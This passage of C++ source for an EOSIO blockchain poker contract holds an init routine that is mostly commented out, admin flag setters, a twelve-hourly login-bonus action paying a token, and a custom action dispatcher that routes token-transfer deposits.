        itr9 = paccounts.erase(itr9);
    }

*/
}




void pokergame1::init() {
    require_auth(_self);

    /*
    int cnt = 0;
    auto itr = gaccounts.begin();
    for (int i = 0; i < 125; i++) {
        itr++;
    }
    while (cnt < 25 && itr != gaccounts.end()) {
        uint32_t lev = getlevel(itr->teosin);
        auto itr_paccount = paccounts.emplace(_self, [&](auto &p){
            p.owner = itr->owner;
            p.level = lev;
            p.exp = itr->teosin * 50;
        });

        cnt++;
        itr++;
    }
     */
    /*
    uint32_t cnt = 0;
    for (auto itr = gaccounts.begin();  cnt < ; itr++) {
        uint32_t lev = getlevel(itr->teosin);

        auto itr_paccount = paccounts.find(itr->owner);
        if (itr_paccount == paccounts.end()) {
            auto itr_paccount = paccounts.emplace(_self, [&](auto &p){
                p.owner = itr->owner;
                p.level = lev;
                p.exp = itr->teosin * 50;
            });
        }

        cnt++;
        */
        /*else {
            paccounts.modify(itr_paccount, _self, [&](auto &p) {
                p.level = lev;
                p.exp = itr->teosin * 50;
            });
        }
    }*/



    /*
    auto itr3 = metadatas.begin();
    auto itr_metadata = metadatas.emplace(_self, [&](auto &p){
        p.eventcnt = 0;
        p.idx = 0;
        p.gameon = 1;
        p.miningon = 0;
        p.tmevout = 0;
        p.teosin = 0;
        p.teosout = 0;
        p.trounds = 0;
    });
    auto itr4 = secrets.begin();
    //int bnum = tapos_block_num();
    for( int i = 256; i < 1024; ++i ) {
        secrets.emplace(_self, [&](auto &p) {
            p.id = i;
            p.s1 = current_time() + 7 * i;
        });
    }
    auto itr5 = cardstats.begin();
    for( int i = 0; i < 52; ++i ) {
        cardstats.emplace(_self, [&](auto &p) {
            p.id = i;
            p.count = 0;
        });
    }

    auto itr6 = typestats.begin();
    for( int i = 0; i < 10; ++i ) {
        typestats.emplace(_self, [&](auto &p) {
            p.id = i;
            p.count = 0;
        });
    }
    */
}

void pokergame1::setgameon(uint64_t id, uint32_t flag) {
    require_auth(_self);
    auto itr = metadatas.find(id);
    if (itr != metadatas.end()) {
        metadatas.modify(itr, _self, [&](auto &p) {
            p.gameon = flag;
        });
    }
}

void pokergame1::setminingon(uint64_t id, uint32_t flag) {
    require_auth(_self);
    auto itr = metadatas.find(id);
    if (itr != metadatas.end()) {
        metadatas.modify(itr, _self, [&](auto &p) {
            p.miningon = flag;
        });
    }
}

void pokergame1::setseed(const name from, uint32_t seed) {
    require_auth(_self);

}

void pokergame1::getbonus(const name from, const uint32_t type, uint32_t externalsrc) {
    require_auth(from);

    uint32_t curtime = now();
    auto itr_paccount = paccounts.find(from);
    if (itr_paccount == paccounts.end()) {
        itr_paccount = paccounts.emplace(_self, [&](auto &p){
            p.owner = name{from};
            p.level = 0;
            p.exp = 0;
            p.lastbonus = 0;
            p.lastseen = 0;
            p.logins = 0;
            p.bonusnumber = 0;
        });
    }

    eosio_assert(itr_paccount->lastbonus + 12 * 3600 < curtime, "Next bonus is not ready.");

    checksum256 roothash = gethash(from, externalsrc, 0);
    uint64_t temp = roothash.hash[3];
    temp <<= 32;
    temp |= roothash.hash[6];

    uint32_t num = temp % 10000;
    if (num == 9999) num = from % 2 == 0 ? 9997 : 9998;

    paccounts.modify(itr_paccount, _self, [&](auto &p){
        p.lastbonus = curtime;
        p.bonusnumber = num;
    });
/*

    asset bal = asset(itr_user->betwin, symbol_type(S(4, EOS)));
    if (bal.amount > 0) {
        // withdraw
        action(permission_level{_self, N(active)}, N(eosio.token),
               N(transfer), std::make_tuple(_self, from, bal,
                                            std::string("Winner winner chicken dinner! - jacks.MyEosVegas.com")))
                .send();
    }
*/
    asset bal2 = asset(1, symbol_type(S(4, MEV)));
    action(permission_level{_self, N(active)}, N(eosvegascoin),
           N(transfer), std::make_tuple(N(eosvegasjack), from, bal2,
                                        std::string("Login bonus!")))
            .send();
}

/*
void pokergame1::setcards(const name from, uint32_t c1, uint32_t c2, uint32_t c3, uint32_t c4, uint32_t c5) {
    require_auth(_self);
    auto itr_user1 = pools.find(from);
    pools.modify(itr_user1, _self, [&](auto &p){
        p.card1 = c1;
        p.card2 = c2;
        p.card3 = c3;
        p.card4 = c4;
        p.card5 = c5;
    });
}
 */










#define EOSIO_ABI_EX( TYPE, MEMBERS ) \
extern "C" { \
   void apply(uint64_t receiver, uint64_t code, uint64_t action) { \
      auto self = receiver; \
      if( action == N(onerror)) { \
         /* onerror is only valid if it is for the "eosio" code account and authorized by "eosio"'s "active permission */ \
         eosio_assert(code == N(eosio), "onerror action's are only valid from the \"eosio\" system account"); \
      } \
      if(code == self || code == N(eosio.token) || code == N(eosvegascoin)) { \
          if (action == N(transfer) && code == self) { \
              return; \
          } \
          TYPE thiscontract(self); \
          if (action == N(transfer) && code == N(eosvegascoin)) { \
              return; \
          } \
          if (action == N(transfer) && code == N(eosio.token)) { \
              currency::transfer tr = unpack_action_data<currency::transfer>(); \
              if (tr.to == self) { \
                  thiscontract.deposit(tr, code, 0); \
              } \
              return; \
          } \
          if (code != self) { \
              return; \
          } \
          switch(action) { \
              EOSIO_API(TYPE, MEMBERS) \
          } \
      } \
   } \
}

//EOSIO_ABI_EX(pokergame1, (dealreceipt)(drawcards)(clear)(setseed)(setcards)(init)(setgameon)(setminingon)(signup))
EOSIO_ABI_EX(pokergame1, (dealreceipt)(receipt5x)(drawcards)(drawcards5x)(clear)(setseed)(init)(setgameon)(setminingon)(signup)(getbonus))
